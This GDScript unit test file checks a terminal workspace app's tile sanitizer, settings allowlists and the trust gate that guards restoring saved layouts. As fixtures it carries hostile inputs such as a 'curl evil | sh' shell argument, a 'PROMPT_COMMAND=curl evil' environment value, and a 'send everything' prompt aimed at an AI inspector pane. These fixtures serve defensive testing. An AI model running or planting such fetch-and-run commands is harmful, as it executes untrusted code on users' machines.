extends GutTest
# Unit tests for layout/tile sanitization (PaneTypes helpers) and typed
# pane settings application. No GDExtension classes required.

var _scene: Control

func before_each():
	MockAutoloads.setup()
	_scene = TestScene.create()
	add_child(_scene)

func after_each():
	for c in _scene.get_children():
		_scene.remove_child(c)
		c.free()
	MockAutoloads.teardown()
	if _scene:
		remove_child(_scene)
		_scene.free()

# ── PaneTypes.shell_run_args ───────────────────────────────────────────

## The pane API runs a command through the user's configured shell, and the
## "run this and exit" flag is not the same in every shell family: cmd.exe —
## the Windows default — rejects the POSIX `-c`, which is how `pane-run` used
## to fail there.
func test_shell_run_args_follow_the_shell_family():
	assert_eq(PaneTypes.shell_run_args("cmd.exe", "echo hi"), ["/c", "echo hi"])
	assert_eq(PaneTypes.shell_run_args("cmd", "echo hi"), ["/c", "echo hi"])
	assert_eq(
		PaneTypes.shell_run_args("C:\\Windows\\System32\\CMD.EXE", "echo hi"),
		["/c", "echo hi"],
		"the path and the case of the program must not change the flag"
	)
	assert_eq(PaneTypes.shell_run_args("/bin/bash", "echo hi"), ["-c", "echo hi"])
	assert_eq(PaneTypes.shell_run_args("pwsh", "echo hi"), ["-c", "echo hi"])
	assert_eq(PaneTypes.shell_run_args("", "echo hi"), ["-c", "echo hi"])

# ── PaneTypes.clamp_grid_int ───────────────────────────────────────────

func test_clamp_grid_int_non_numeric_yields_lo():
	assert_eq(PaneTypes.clamp_grid_int("x", 0, 11), 0)
	assert_eq(PaneTypes.clamp_grid_int(null, 0, 11), 0)

func test_clamp_grid_int_clamps_range():
	assert_eq(PaneTypes.clamp_grid_int(-5, 0, 11), 0)
	assert_eq(PaneTypes.clamp_grid_int(99, 0, 11), 11)
	assert_eq(PaneTypes.clamp_grid_int(4.7, 0, 11), 4)

# ── PaneTypes.sanitize_tile ────────────────────────────────────────────

func test_sanitize_tile_rejects_non_dictionary():
	assert_eq(PaneTypes.sanitize_tile("not-a-dict"), {})

func test_sanitize_tile_rejects_non_dict_settings():
	assert_eq(PaneTypes.sanitize_tile({"settings": "not-a-dict"}), {})

func test_sanitize_tile_rejects_unknown_type():
	assert_eq(PaneTypes.sanitize_tile({"settings": {"type": "teleporter"}}), {})

func test_sanitize_tile_clamps_bad_geometry():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "terminal"},
		"col": "x", "row": -3, "cspan": 99, "rspan": 0,
	}, 12)
	assert_eq(st["col"], 0)
	assert_eq(st["row"], 0)
	assert_eq(st["cspan"], 12)
	assert_eq(st["rspan"], 1)

func test_sanitize_tile_keeps_cspan_within_grid():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "code_viewer"},
		"col": 10, "row": 0, "cspan": 12, "rspan": 12,
	}, 12)
	assert_eq(st["col"], 10)
	assert_eq(st["cspan"], 2)
	assert_eq(st["rspan"], 12)

func test_sanitize_tile_roundtrips_valid_tile():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "file_tree", "root_path": "/tmp"},
		"col": 0, "row": 0, "cspan": 6, "rspan": 12,
	}, 12)
	assert_eq(st["type_name"], "file_tree")
	assert_eq(st["settings"]["root_path"], "/tmp")
	assert_eq(st["cspan"], 6)
	assert_eq(st["rspan"], 12)

# ── PaneTypes.sanitize_shell ───────────────────────────────────────────

func test_sanitize_shell_accepts_valid_string():
	assert_eq(PaneTypes.sanitize_shell("/bin/zsh", "/bin/bash"), "/bin/zsh")

func test_sanitize_shell_falls_back_on_bad_values():
	assert_eq(PaneTypes.sanitize_shell(null, "/bin/bash"), "/bin/bash")
	assert_eq(PaneTypes.sanitize_shell("sh\uFFFDrm", "/bin/bash"), "/bin/bash")
	assert_eq(PaneTypes.sanitize_shell("", "/bin/bash"), "/bin/bash")

func test_sanitize_shell_rejects_invalid_unicode_and_oversized():
	assert_eq(PaneTypes.sanitize_shell("sh\uFFFDrm", "/bin/bash"), "/bin/bash")
	var long: String = "x".repeat(2048)
	assert_eq(PaneTypes.sanitize_shell(long, "/bin/bash"), "/bin/bash")

# ── PaneTypes.sanitize_shell_args ──────────────────────────────────────

func test_sanitize_shell_args_accepts_valid_strings():
	var out = PaneTypes.sanitize_shell_args(["-c", "echo hi && exit 7"])
	assert_eq(out, ["-c", "echo hi && exit 7"], "valid string args must pass through")

func test_sanitize_shell_args_rejects_junk_and_caps():
	var big := []
	for i in 40:
		big.append("arg%d" % i)
	var out = PaneTypes.sanitize_shell_args(
		big + ["", 42, null, {"x": 1}, "bad\uFFFDevil", "x".repeat(5000)])
	assert_eq(out.size(), 32, "shell args must cap at 32")
	assert_false(str(out).contains("bad\uFFFD"), "U+FFFD args must be dropped")
	# Non-array input degrades to an empty list.
	assert_eq(PaneTypes.sanitize_shell_args("not-an-array"), [])

# ── PaneTypes.sanitize_tags ────────────────────────────────────────────

## A value that is not an array must not raise. `sanitize_tags` is called
## from the IPC drain loop, where one raise abandons every queued request —
## a typed parameter here made `{"tags": "x"}` a batch-wide failure.
func test_sanitize_tags_degrades_a_non_array_to_no_tags():
	assert_eq(PaneTypes.sanitize_tags("agent"), [], "a string is no tag list")
	assert_eq(PaneTypes.sanitize_tags(null), [])
	assert_eq(
		PaneTypes.sanitize_tags("agent,ci"), [],
		"a joined string is the CLI's spelling, not the wire's: the caller splits it")
	assert_eq(PaneTypes.sanitize_tags(["agent", "ci"]), ["agent", "ci"])

# ── PaneTypes.sanitize_title ───────────────────────────────────────────

## A title is one line on the title bar, not arbitrary text: control
## characters are dropped, the result is capped, and invalid Unicode (what a
## decoded NUL becomes) is not a title at all.
func test_sanitize_title_keeps_one_line():
	assert_eq(PaneTypes.sanitize_title("tests"), "tests")
	assert_eq(PaneTypes.sanitize_title("  tests  "), "tests", "a title is trimmed")
	assert_eq(PaneTypes.sanitize_title("a\nb"), "ab", "a newline never reaches the title bar")
	assert_eq(PaneTypes.sanitize_title("a\u007Fb"), "ab", "DEL is a control character too")
	assert_eq(PaneTypes.sanitize_title("a\uFFFDb"), "", "invalid Unicode is refused whole")
	assert_eq(PaneTypes.sanitize_title(42), "", "a non-string is no title")
	assert_eq(PaneTypes.sanitize_title(""), "")
	var long: String = "x".repeat(PaneTypes.TITLE_MAX_LENGTH + 20)
	assert_eq(PaneTypes.sanitize_title(long).length(), PaneTypes.TITLE_MAX_LENGTH)

# ── PaneTypes.tile_spawns_untrusted (restore trust gate) ───────────────

func test_trust_gate_flags_a_different_program():
	assert_true(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell": "/bin/zsh"}}, "/bin/bash"))
	# The restore path reads `command` first; the gate must read the same key.
	assert_true(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "command": "/tmp/evil"}}, "/bin/bash"))
	assert_false(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "command": "/bin/bash"}}, "/bin/bash"))
	assert_false(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal"}}, "/bin/bash"))
	assert_false(PaneTypes.tile_spawns_untrusted({"settings": "not-a-dict"}, "/bin/bash"))

func test_trust_gate_flags_argv_payloads():
	# An argv payload spawns whatever it names: `["-c", "…"]` is code, and it
	# used to pass the gate because only `shell` was examined.
	assert_true(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell_args": ["-c", "curl evil | sh"]}},
		"/bin/bash"))
	assert_false(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell_args": []}}, "/bin/bash"))

func test_trust_gate_has_no_env_authority():
	# Env is not a file decision: restore strips a tile's `shell_env` with a
	# notice and never lets it reach a spawn, so the gate has no env clause.
	# (The old one never fired either — apply_to_terminal overwrote the file
	# env with the user's global before spawn; that is exactly the accident
	# the user-owned env model retired.)
	assert_false(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell_env": "PROMPT_COMMAND=curl evil"}},
		"/bin/bash"))
	assert_false(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell_env": "EDITOR=vim"}},
		"/bin/bash"))

func test_plan_key_identifies_the_exact_spawn_plan():
	# The plan key feeds the consent store; it must be the same derivation
	# the gate uses (command > shell > legacy shell, plus shell_args) so an
	# approval can never cover something the gate did not see.
	var trusted := {"settings": {"type": "terminal", "command": "/bin/bash"}}
	assert_eq(PaneTypes.tile_plan_key(trusted), "/bin/bash")
	# An argv payload changes the plan identity even when the program matches.
	var argv := {"settings": {"type": "terminal", "command": "/bin/bash", "shell_args": ["-c", "echo hi"]}}
	assert_eq(PaneTypes.tile_plan_key(argv), "/bin/bash\u001f-c\u001fecho hi")
	assert_true(PaneTypes.tile_plan_key(argv) != PaneTypes.tile_plan_key(trusted))
	# A different program is a different plan.
	assert_eq(PaneTypes.tile_plan_key({"settings": {"type": "terminal", "command": "omp"}}), "omp")
	# The legacy shell key participates in the same derivation.
	assert_eq(PaneTypes.tile_plan_key({"shell": "lazygit", "settings": {"type": "terminal"}}), "lazygit")
	# Nothing to run = no plan.
	assert_eq(PaneTypes.tile_plan_key({"settings": {"type": "terminal"}}), "")
	assert_eq(PaneTypes.tile_plan_key({}), "")

func test_plan_key_carries_the_approved_directory():
	# The trust key names the directory the spawn will start in, so editing a
	# workspace file cannot repoint an approved program at other content.
	var tile := {"settings": {"type": "terminal", "command": "omp"}}
	assert_eq(PaneTypes.tile_plan_key(tile, "/srv/repo"), "omp\u001e/srv/repo")
	assert_true(PaneTypes.tile_plan_key(tile, "/srv/repo") != PaneTypes.tile_plan_key(tile, "/tmp/other"),
		"another directory is another plan")
	assert_eq(PaneTypes.tile_plan_key(tile, ""), PaneTypes.tile_plan_key(tile),
		"an empty directory leaves the content identity")
	# The directory separator is not the argv separator: an argv whose last
	# entry is an absolute path must not serialize to the same key as a
	# directory (which is why the two use different control characters).
	var argv_path := {"settings": {"type": "terminal", "command": "omp", "shell_args": ["/srv/repo"]}}
	assert_ne(PaneTypes.tile_plan_key(argv_path), PaneTypes.tile_plan_key(tile, "/srv/repo"))

func test_trust_gate_covers_a_cli_view_tile():
	# CLI View spawns a program plus its argv through exactly the terminal
	# keys (`command` + `shell_args`), so a tile that names them is untrusted
	# by the same derivation — no new clause, and no hole in the restore gate
	# for a layout file that would otherwise get a program launched for free.
	var tile := {"settings": {
		"type": "cli_view", "command": "/tmp/probe", "shell_args": ["--flag", "value"],
	}}
	assert_true(PaneTypes.tile_spawns_untrusted(tile, "/bin/bash"))
	assert_eq(PaneTypes.tile_plan_key(tile), "/tmp/probe\u001f--flag\u001fvalue")

	# A CLI View tile that names nothing to run starts no process, so there is
	# nothing to consent to.
	var idle := {"settings": {"type": "cli_view"}}
	assert_false(PaneTypes.tile_spawns_untrusted(idle, "/bin/bash"))
	assert_eq(PaneTypes.tile_plan_key(idle), "")

# ── PaneTypes.untrusted_plan (what the trust dialog shows) ─────────────

func test_untrusted_plan_lists_what_will_run():
	var plan = PaneTypes.untrusted_plan({
		"settings": {
			"type": "terminal", "command": "/bin/zsh",
			"shell_args": ["-c", "curl evil | sh"],
			"shell_env": "PYTHONPATH=/tmp/mod",
		},
	}, "/bin/bash")
	var text := "\n".join(plan)
	assert_string_contains(text, "program: /bin/zsh")
	assert_string_contains(text, "arguments: -c, curl evil | sh")
	assert_false(text.contains("environment"), "env is not a file decision — nothing to show")

func test_untrusted_plan_is_empty_for_a_trusted_tile():
	assert_eq(PaneTypes.untrusted_plan({"settings": {"type": "terminal"}}, "/bin/bash").size(), 0)

func test_untrusted_plan_caps_value_length():
	var long_program := "x".repeat(PaneTypes.TRUST_MAX_VALUE_LEN + 50)
	var plan = PaneTypes.untrusted_plan(
		{"settings": {"type": "terminal", "command": long_program}}, "/bin/bash")
	assert_true(plan[0].length() < long_program.length() + 16,
		"an oversized value must be truncated for display")

# ── Launch lines (a tile's spawn-time shell command) ───────────────────

func test_a_launch_line_is_one_trimmed_line():
	assert_eq(PaneTypes.sanitize_launch("  omp update && exec omp  "), "omp update && exec omp")
	assert_eq(PaneTypes.sanitize_launch(""), "")
	assert_eq(PaneTypes.sanitize_launch("   "), "")
	assert_eq(PaneTypes.sanitize_launch("a\nb"), "", "a newline is a second line")
	assert_eq(PaneTypes.sanitize_launch("a\tb"), "")
	assert_eq(PaneTypes.sanitize_launch("a\u007Fb"), "", "DEL is a control character too")
	assert_eq(PaneTypes.sanitize_launch("a\u009Fb"), "", "the C1 range is control too")
	assert_eq(PaneTypes.sanitize_launch("a\uFFFDb"), "", "invalid Unicode is refused whole")
	assert_eq(PaneTypes.sanitize_launch(42), "", "a non-string is no line")
	var longest: String = "x".repeat(PaneTypes.LAUNCH_MAX_LENGTH)
	assert_eq(PaneTypes.sanitize_launch(longest), longest)
	assert_eq(PaneTypes.sanitize_launch(longest + "x"), "",
		"an oversize line is refused, never truncated")

func test_a_launch_tile_is_untrusted_and_keyed_by_its_line():
	var line := "omp update && exec omp"
	var launch := {"settings": {"type": "terminal", "launch": line}}
	assert_true(PaneTypes.tile_spawns_untrusted(launch, "/bin/bash"),
		"a shell line is a spawn decision whatever the default program is")
	assert_eq(PaneTypes.tile_plan_key(launch), PaneTypes.LAUNCH_KEY_MARK + line)
	assert_ne(PaneTypes.tile_plan_key(launch),
		PaneTypes.tile_plan_key({"settings": {"type": "terminal", "launch": "nvim ."}}),
		"a changed line is a different plan")
	assert_eq(PaneTypes.tile_plan_key(launch, "/srv/repo"),
		PaneTypes.LAUNCH_KEY_MARK + line + "\u001e/srv/repo")
	# The marker is U+FFFD: a plain argv carrying the same text derives a
	# different key, so a launch approval can never cover it.
	var argv := {"settings": {"type": "terminal", "shell_args": ["-c", line]}}
	assert_ne(PaneTypes.tile_plan_key(argv), PaneTypes.tile_plan_key(launch))
	assert_eq(PaneTypes.tile_plan_key({"settings": {"type": "terminal"}}), "",
		"a tile with no plan and no launch has no key")

func test_spawn_argv_expands_a_launch_line_through_the_configured_shell():
	var line := "omp update && exec omp"
	var posix := PaneTypes.spawn_argv("/bin/zsh", ["-x"], line, "/bin/bash")
	assert_eq(posix["program"], "/bin/bash",
		"the configured shell is the runner, not the tile's program")
	assert_eq(posix["args"], ["-c", line], "a launch line wins over the tile's argv")
	assert_eq(posix["launch"], line)
	assert_eq(PaneTypes.spawn_argv("/bin/bash", [], line, "cmd.exe")["args"], ["/c", line])
	assert_eq(PaneTypes.spawn_argv("/bin/bash", [], line, "pwsh")["args"], ["-c", line])
	var inherited := PaneTypes.spawn_argv("/bin/zsh", ["-l"], "", "/bin/bash")
	assert_eq(inherited["program"], "/bin/zsh", "no launch line keeps the pane's program")
	assert_eq(inherited["args"], ["-l"])
	assert_eq(inherited["launch"], "")
	var refused := PaneTypes.spawn_argv("/bin/zsh", ["-l"], "a\nb", "/bin/bash")
	assert_eq(refused["launch"], "",
		"a refused line falls back to the program instead of spawning half of it")

func test_untrusted_plan_names_the_runner_and_the_launch_line():
	var plan := PaneTypes.untrusted_plan(
		{"settings": {"type": "terminal", "launch": "omp update && exec omp"}}, "/bin/bash")
	assert_eq("\n".join(plan), "program: /bin/bash\nlaunch: omp update && exec omp")

func test_a_launch_line_is_a_terminal_setting_a_file_may_ship():
	var kept: Dictionary = PaneTypes.sanitize_settings(
		"terminal", {"launch": "omp update && exec omp"}, PaneTypes.SOURCE_FILE)
	assert_eq(kept["settings"].get("launch"), "omp update && exec omp")
	var other: Dictionary = PaneTypes.sanitize_settings(
		"code_viewer", {"launch": "omp"}, PaneTypes.SOURCE_FILE)
	assert_false(other["settings"].has("launch"), "only a terminal spawns a launch line")
	assert_true(other["dropped"].has("launch"), "the refusal is reported")
	var bad: Dictionary = PaneTypes.sanitize_settings(
		"terminal", {"launch": "a\nb"}, PaneTypes.SOURCE_FILE)
	assert_false(bad["settings"].has("launch"),
		"a control character is refused, never silently emptied")
	assert_true(bad["dropped"].has("launch"))
	var tile := PaneTypes.sanitize_tile({
		"settings": {"type": "terminal", "launch": "  nvim .  "},
		"col": 0, "row": 0, "cspan": 6, "rspan": 12,
	})
	assert_eq(tile["settings"].get("launch"), "nvim .", "a file's line is trimmed and kept")
	assert_eq(tile.get("dropped", PackedStringArray()).size(), 0)

# ── PaneBody typed settings application ────────────────────────────────

func test_pane_body_ignores_unknown_and_bad_type_keys():
	var body = PaneBody.new()
	_scene.add_child(body)
	body.font_size = 14
	body.pane_name = "keep"
	body.apply_settings({"font_size": "big", "pane_name": 99, "bogus": true})
	assert_eq(body.font_size, 14)
	assert_eq(body.pane_name, "keep")

func test_migrate_observer_answer_becomes_inspector():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "observer", "stream": "answer", "backend": "omp"},
		"col": 0, "row": 0, "cspan": 6, "rspan": 12,
	})
	assert_eq(st["type_name"], "inspector")
	assert_eq(st["settings"]["type"], "inspector")
	assert_false(st["settings"].has("stream"))

func test_migrate_observer_thinking_becomes_reasoning():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "observer", "stream": "thinking"},
		"col": 0, "row": 0, "cspan": 6, "rspan": 12,
	})
	assert_eq(st["type_name"], "reasoning")
	assert_eq(st["settings"]["type"], "reasoning")
	assert_false(st["settings"].has("stream"))

func test_sanitize_attachment_id_rejects_invalid():
	assert_eq(PaneTypes.sanitize_attachment_id("OMP"), "")
	assert_eq(PaneTypes.sanitize_attachment_id("omp-terminal"), "omp-terminal")
	assert_eq(PaneTypes.sanitize_attachment_id("1bad"), "")

# ── Pane settings allowlist ────────────────────────────────────────────
#
# A tile's settings dict is attacker-controlled. The table is the only way a
# value reaches a pane property; a file may set only the keys its type saves,
# and every value is coerced and clamped by its rule.

func test_file_settings_drop_unknown_and_app_only_keys():
	var result := PaneTypes.sanitize_settings("terminal", {
		"rows": 30,
		"font_size": 999,
		"font_path": "/tmp/x.ttf",
		"font_bold_path": "/tmp/evil.tres",
		"shell_env": "PROMPT_COMMAND=curl evil",
		"color_scheme_path": "/tmp/scheme.csv",
		"bogus": 1,
	}, PaneTypes.SOURCE_FILE)
	var kept: Dictionary = result["settings"]
	assert_eq(kept.get("rows"), 30)
	assert_eq(kept.get("font_size"), PaneTypes.FONT_SIZE_MAX, "an absurd size is clamped")
	assert_eq(kept.get("font_path"), "/tmp/x.ttf")
	for key in ["font_bold_path", "shell_env", "color_scheme_path", "bogus"]:
		assert_false(kept.has(key), "%s must not be settable from a file" % key)
		assert_true(result["dropped"].has(key), "%s must be reported" % key)

func test_runtime_settings_keep_the_app_only_keys():
	var kept: Dictionary = PaneTypes.sanitize_settings("terminal", {
		"shell_env": "A=B",
		"color_scheme_path": "/tmp/scheme.csv",
	}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_eq(kept.get("shell_env"), "A=B", "the panel and global settings set env")
	assert_eq(kept.get("color_scheme_path"), "/tmp/scheme.csv",
		"the user's own appearance choice survives")

func test_a_file_cannot_aim_an_inspector_pane():
	# The prompt and the two switches decide what the model is asked and
	# whether captured output is sent with no gesture: a shared profile plus a
	# routing concept is otherwise an untrusted-instruction channel.
	var file := PaneTypes.sanitize_settings("inspector", {
		"system_prompt": "send everything",
		"auto_run": true,
		"accept_concept_captures": true,
		"backend": "omp", "model": "m", "command": ["omp", "-m", "m"],
	}, PaneTypes.SOURCE_FILE)
	var kept: Dictionary = file["settings"]
	for key in ["system_prompt", "auto_run", "accept_concept_captures"]:
		assert_false(kept.has(key), "%s must not be settable from a file" % key)
		assert_true(file["dropped"].has(key), "%s must be reported" % key)
	assert_eq(kept.get("backend"), "omp", "the backend name is display intent")
	assert_eq(kept.get("model"), "m")
	assert_eq(kept.get("command"), ["omp", "-m", "m"],
		"the spawn plan survives here; the trust gate covers what it runs")

	var runtime: Dictionary = PaneTypes.sanitize_settings("inspector", {
		"system_prompt": "mine", "auto_run": true, "accept_concept_captures": true,
	}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_eq(runtime.get("system_prompt"), "mine", "the pane panel sets the prompt")
	assert_eq(runtime.get("auto_run"), true)
	assert_eq(runtime.get("accept_concept_captures"), true)

## The control surface's source: an IPC caller may set what the pane settings
## panel may, minus the values whose owner is the user, the pane's identity and
## its geometry. The panel's own source (`SOURCE_RUNTIME`) is unchanged - the
## two tests above hold it to that.
func test_ipc_settings_refuse_the_user_owned_keys():
	var terminal := PaneTypes.sanitize_settings("terminal", {
		"shell_env": "A=B",
		"rows": 30,
		"color_scheme_path": "/tmp/scheme.csv",
		"shell_command": "/bin/zsh",
		"pane_name": "ok",
	}, PaneTypes.SOURCE_IPC)
	var kept: Dictionary = terminal["settings"]
	assert_eq(kept.get("color_scheme_path"), "/tmp/scheme.csv",
		"an appearance path is the caller's to set, like the panel's")
	assert_eq(kept.get("shell_command"), "/bin/zsh",
		"the pane's program is a setting; `new-pane --command` runs through it")
	assert_eq(kept.get("pane_name"), "ok")
	for key in ["shell_env", "rows"]:
		assert_false(kept.has(key), "%s must not be settable over IPC" % key)
		assert_true(terminal["dropped"].has(key), "%s must be reported" % key)

	var inspector := PaneTypes.sanitize_settings("inspector", {
		"system_prompt": "send everything",
		"auto_run": true,
		"accept_concept_captures": true,
		"backend": "omp", "model": "m",
	}, PaneTypes.SOURCE_IPC)
	kept = inspector["settings"]
	for key in ["system_prompt", "auto_run", "accept_concept_captures"]:
		assert_false(kept.has(key), "%s is the user's own aim, not a caller's" % key)
		assert_true(inspector["dropped"].has(key), "%s must be reported" % key)
	assert_eq(kept.get("backend"), "omp", "the backend and model are saved settings")

	var wiki := PaneTypes.sanitize_settings("wiki", {
		"graph": true, "open_note": "a.md", "view_mode": "split",
	}, PaneTypes.SOURCE_IPC)
	kept = wiki["settings"]
	assert_eq(kept.get("view_mode"), "split", "the mode applies live")
	for key in ["graph", "open_note"]:
		assert_false(kept.has(key), "%s is a restore gesture (`pane-view` owns it)" % key)

	# Identity and the discriminator, for every type that has a table.
	for type_name in PaneTypes.ALL:
		var identity := PaneTypes.sanitize_settings(type_name, {
			"type": "terminal", "attachment_id": "other",
		}, PaneTypes.SOURCE_IPC)
		assert_false(identity["settings"].has("type"), "%s: type is read, never set" % type_name)
		assert_false(identity["settings"].has("attachment_id"),
			"%s: the id is the pane's address" % type_name)
		assert_eq(identity["dropped"].size(), 2, "%s: both must be reported" % type_name)

## A closed set is the table's, not the pane's: at every source an unknown
## member is refused, and a member of the set survives unchanged.
func test_a_closed_set_refuses_a_member_it_does_not_know():
	var closed := [
		["wiki", "view_mode", "bogus", "preview"],
		["code_viewer", "view_mode", "bogus", "rendered"],
		["code_viewer", "language", "klingon", "md"],
		["file_tree", "open_in", "bogus", "system"],
	]
	for entry in closed:
		var type_name: String = entry[0]
		var key: String = entry[1]
		for source in [PaneTypes.SOURCE_FILE, PaneTypes.SOURCE_RUNTIME, PaneTypes.SOURCE_IPC]:
			var refused := PaneTypes.sanitize_settings(type_name, {key: entry[2]}, source)
			assert_false(refused["settings"].has(key),
				"%s.%s must refuse an unknown member" % [type_name, key])
			assert_true(refused["dropped"].has(key),
				"%s.%s must name the refusal" % [type_name, key])
			var accepted := PaneTypes.sanitize_settings(type_name, {key: entry[3]}, source)
			assert_eq(accepted["settings"].get(key), entry[3],
				"%s.%s must accept a member of its set" % [type_name, key])
			assert_eq(accepted["dropped"].size(), 0,
				"%s.%s must report nothing dropped" % [type_name, key])

## A file is the source the restore notice reads: a bad member is dropped from
## the tile and named, never applied.
func test_a_saved_tile_names_a_refused_closed_set_member():
	var tile := PaneTypes.sanitize_tile({
		"settings": {"type": "wiki", "view_mode": "bogus"},
		"col": 0, "row": 0, "cspan": PaneTypes.GRID, "rspan": PaneTypes.GRID,
	})
	assert_false(tile["settings"].has("view_mode"), "a refused mode never reaches the pane")
	assert_true(tile["dropped"].has("view_mode"), "the restore notice names it")

## The Inspector's backend is not a closed set: closing it would reset the
## `Custom:` row a shipped row added on purpose.
func test_a_backend_alias_folds_and_an_unknown_name_is_kept():
	var aliased: Dictionary = PaneTypes.sanitize_settings("inspector", {
		"backend": "pi",
	}, PaneTypes.SOURCE_FILE)["settings"]
	assert_eq(aliased.get("backend"), "omp", "an alias is stored as its kind")

	var custom := PaneTypes.sanitize_settings("inspector", {"backend": "gpt-5"})
	assert_eq(custom["settings"].get("backend"), "gpt-5", "an unknown name stays verbatim")
	assert_eq(custom["dropped"].size(), 0, "a custom name is not a drop")

	var defaulted: Dictionary = PaneTypes.sanitize_settings("inspector", {"backend": ""})["settings"]
	assert_eq(defaulted.get("backend"), "omp", "an empty value is the pane default")

	var too_long := PaneTypes.sanitize_settings("inspector", {"backend": "x".repeat(40)})
	assert_false(too_long["settings"].has("backend"), "the rule's length cap still applies")
	assert_true(too_long["dropped"].has("backend"))

func test_settings_values_are_coerced_and_clamped():
	var kept: Dictionary = PaneTypes.sanitize_settings("terminal", {
		"font_size": 1, "scroll_lines": 99.9, "cursor_blink_speed": 99,
		"rows": 100000, "cols": "wide", "cursor_shape": 7,
		"default_fg": "(1, 0, 0, 0.5)", "cursor_color": "red",
		"pane_name": "x".repeat(500),
	}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_eq(kept.get("font_size"), PaneTypes.FONT_SIZE_MIN)
	assert_eq(kept.get("scroll_lines"), 10)
	assert_eq(kept.get("cursor_blink_speed"), 2.0)
	assert_eq(kept.get("rows"), PaneTypes.PANE_MAX_ROWS)
	assert_false(kept.has("cols"), "a non-numeric grid size is dropped")
	assert_eq(kept.get("cursor_shape"), 2, "the three cursor shapes are the range")
	assert_eq(kept.get("default_fg"), "(1, 0, 0, 0.5)", "a saved color string survives")
	assert_false(kept.has("cursor_color"), "a non-color string is dropped")
	assert_false(kept.has("pane_name"), "an oversized name is dropped")

func test_font_paths_are_gated_by_extension_and_absolute():
	var kept: Dictionary = PaneTypes.sanitize_settings(
		"terminal", {"font_path": "fonts/relative.ttf"}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_false(kept.has("font_path"), "a data path must be absolute")
	kept = PaneTypes.sanitize_settings(
		"terminal", {"font_path": "/fonts/x.res"}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_false(kept.has("font_path"), "a resource is not a font")
	kept = PaneTypes.sanitize_settings(
		"terminal", {"font_path": "res://fonts/DejaVuSansMono.ttf"}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_false(kept.has("font_path"), "only compile-time constants are res://")
	kept = PaneTypes.sanitize_settings(
		"terminal", {"font_path": "/fonts/x.TTF"}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_eq(kept.get("font_path"), "/fonts/x.TTF")

func test_other_types_are_validated_by_their_own_rules():
	var kept: Dictionary = PaneTypes.sanitize_settings(
		"inspector", {"command": ["a", 5, "", "b"]}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_eq(kept.get("command"), ["a", "b"], "argv is sanitized, not passed through")
	kept = PaneTypes.sanitize_settings(
		"reasoning", {"source_attachment_id": "OMP"}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_false(kept.has("source_attachment_id"), "a malformed id is dropped")
	kept = PaneTypes.sanitize_settings(
		"cli_view", {"command": 123, "shell_args": ["ok", 5, ""]}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_false(kept.has("command"), "a non-string program is dropped")
	assert_eq(kept.get("shell_args"), ["ok"])
	kept = PaneTypes.sanitize_settings(
		"cli_view", {"command": "x".repeat(2048)}, PaneTypes.SOURCE_RUNTIME)["settings"]
	assert_false(kept.has("command"), "an oversized program is dropped")
	kept = PaneTypes.sanitize_settings(
		"media", {"volume_db": 99, "loop": true}, PaneTypes.SOURCE_FILE)["settings"]
	assert_eq(kept.get("volume_db"), 6.0, "volume is clamped to its range")
	assert_eq(kept.get("loop"), true)

func test_a_tile_keeps_its_spawn_keys_and_reports_dropped_ones():
	var st := PaneTypes.sanitize_tile({
		"settings": {
			"type": "terminal",
			"shell": "/bin/zsh", "command": "lazygit", "shell_env": "A=B",
			"font_bold_path": "/tmp/evil.tres",
			"rows": 99999,
		},
		"col": 0, "row": 0, "cspan": 12, "rspan": 12,
	}, 12)
	var settings: Dictionary = st["settings"]
	for key in ["shell", "command", "shell_env"]:
		assert_true(settings.has(key),
			"%s is consumed by the restore path, not applied as a property" % key)
	assert_eq(settings.get("rows"), PaneTypes.PANE_MAX_ROWS)
	assert_false(settings.has("font_bold_path"), "an unlisted property never reaches the pane")
	assert_true(st["dropped"].has("font_bold_path"), "the ignored key must be reported")
